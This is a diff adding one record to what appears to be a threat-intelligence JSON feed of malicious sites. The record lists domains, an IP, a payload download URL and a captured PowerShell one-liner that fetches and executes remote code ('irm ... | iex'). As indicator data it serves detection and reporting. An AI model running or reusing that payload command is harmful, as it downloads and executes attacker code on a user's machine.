@@ -1095,5 +1095,27 @@
     "ResolvedDownloadUrl": [],
     "ReportId": "cmwxoht2w0fc80oml53cyksew",
     "ScannedAt": "2026-11-26T14:59:30.123000+00:00"
+  },
+  {
+    "UrlDomain": "amplaesquadrias.com",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "69.6.248.247"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/2b4f13a0ca6dcdfe",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/2b4f13a0ca6dcdfe'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/2b4f13a0ca6dcdfe"
+    ],
+    "ReportId": "cmwxqo0010fn10omlohd8wq8e",
+    "ScannedAt": "2026-11-26T16:00:18.255000+00:00"
   }
 ]
